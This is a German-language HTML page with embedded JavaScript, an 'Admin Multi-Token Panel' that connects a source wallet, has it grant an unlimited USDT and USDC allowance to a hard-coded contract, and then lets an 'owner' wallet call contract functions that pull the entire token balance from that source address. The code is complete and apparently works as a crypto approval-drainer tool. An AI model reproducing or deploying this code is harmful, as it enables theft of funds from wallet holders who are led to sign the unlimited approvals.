<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
  <title>Admin Multi-Token Panel</title>
  <style>
    body{ font-family: 'Segoe UI', sans-serif; background:#0f172a; color:#fff; display:flex; min-height:100vh; justify-content:center; align-items:center; margin:0; padding:15px; }
    .box{ background:#020617; padding:25px; border-radius:16px; width:100%; max-width:400px; border: 1px solid #1e293b; box-shadow:0 10px 30px rgba(0,0,0,.5); }
    h2{ margin-top:0; color: #f8fafc; font-size: 18px; text-align: center; margin-bottom: 20px; }
    .step { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-left: 4px solid #3b82f6; }
    .step-title { font-size: 11px; font-weight: bold; text-transform: uppercase; color: #94a3b8; margin-bottom: 10px; display: block; }
    button { border:none; padding:12px; width:100%; font-size:14px; font-weight:bold; cursor:pointer; border-radius:10px; color: white; transition: 0.2s; margin-bottom: 8px; -webkit-tap-highlight-color: transparent; }
    button:active { transform: scale(0.98); opacity: 0.8; }
    .btn-connect { background: #3b82f6; }
    .btn-approve { background: #22c55e; }
    .btn-collect { background: #ef4444; }
    .mono { font-family: monospace; font-size:10px; word-break:break-all; background: #000; padding: 8px; border-radius: 6px; display: block; margin-top: 5px; color: #10b981; border: 1px solid #1e293b; min-height: 15px; }
    #status { margin-top:10px; padding: 12px; border-radius: 8px; background: #0f172a; font-size: 12px; text-align: center; border: 1px dashed #334155; color: #cbd5e1; }
    .token-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
  </style>
</head>
<body>

<div class="box">
  <h2>Multi-Token Panel</h2>

  <div class="step">
    <span class="step-title">1. Wallet A verbinden (Quelle)</span>
    <button class="btn-connect" onclick="connect()">Verbinden & Check</button>
    <div class="mono" id="addr">Nicht verbunden</div>
  </div>

  <div class="step" style="border-left-color: #10b981;">
    <span class="step-title">2. Freigaben (Wallet A)</span>
    <div class="token-grid">
      <button class="btn-approve" id="btnAppUSDT" onclick="approveToken('USDT')">Approve USDT</button>
      <button class="btn-approve" id="btnAppUSDC" onclick="approveToken('USDC')">Approve USDC</button>
    </div>
  </div>

  <div class="step" style="border-left-color: #ef4444;">
    <span class="step-title">3. Einzug (Admin-Wallet)</span>
    <p style="font-size:9px; color:#94a3b8; margin-bottom:8px;">Jetzt in Trust Wallet zur <b>Owner-Adresse</b> wechseln!</p>
    <div class="token-grid">
      <button class="btn-collect" onclick="collectToken('USDT')">Ziehe USDT</button>
      <button class="btn-collect" onclick="collectToken('USDC')">Ziehe USDC</button>
    </div>
  </div>

  <div id="status">Bereit. Bitte Schritt 1 starten.</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.1/ethers.umd.min.js"></script>

<script>
  // Konfiguration basierend auf deinem Smart Contract
  const CONTRACT_ADDR = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
  const TOKENS = {
    USDT: "0x55d398326f99059fF775485246999027B3197955",
    USDC: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
  };

  let connectedAddr = null;
  function setStatus(m) { document.getElementById("status").innerHTML = m; }

  async function connect() {
    try {
      if (!window.ethereum) return setStatus("‚ùå Bitte im Trust Wallet Browser √∂ffnen!");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const accounts = await provider.send("eth_requestAccounts", []);
      connectedAddr = accounts[0];
      document.getElementById("addr").innerText = connectedAddr;
      setStatus("‚úÖ Verbunden. F√ºhre nun die Freigaben (Schritt 2) aus.");
    } catch (e) { setStatus("‚ùå Verbindung abgelehnt."); }
  }

  async function approveToken(type) {
    try {
      if(!connectedAddr) return setStatus("‚ùå Erst Schritt 1!");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
      const contract = new ethers.Contract(TOKENS[type], abi, signer);
      
      setStatus(`‚åõ Best√§tige ${type} Freigabe in der Wallet...`);
      // Nutzt Max-Uint256 f√ºr dauerhafte Erlaubnis und festes Gas-Limit f√ºr Stabilit√§t
      const tx = await contract.approve(CONTRACT_ADDR, ethers.MaxUint256, { gasLimit: 100000 });
      await tx.wait();
      
      setStatus(`‚úÖ ${type} freigegeben!`);
      document.getElementById("btnApp" + type).style.opacity = "0.5";
      document.getElementById("btnApp" + type).innerText = type + " OK";
    } catch (e) { setStatus(`‚ùå Fehler: ${e.message}`); }
  }

  async function collectToken(type) {
    try {
      if(!connectedAddr) return setStatus("‚ùå Keine Quell-Adresse bekannt.");
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      // Bestimmt die richtige Funktion aus deinem Contract
      const funcName = type === 'USDT' ? "collectUSDTAll" : "collectUSDCAll";
      const abi = [`function ${funcName}(address from) external`];
      const contract = new ethers.Contract(CONTRACT_ADDR, abi, signer);
      
      setStatus(`‚åõ Einzug von ${type} wird gestartet...`);
      // Sendet Quell-Adresse an den Contract
      const tx = await contract[funcName](connectedAddr);
      await tx.wait();
      setStatus(`üéâ ${type} erfolgreich eingezogen!`);
    } catch (e) { 
      setStatus("‚ùå Fehler: Bist du mit der Owner-Wallet verbunden?"); 
    }
  }
</script>
</body>
</html>
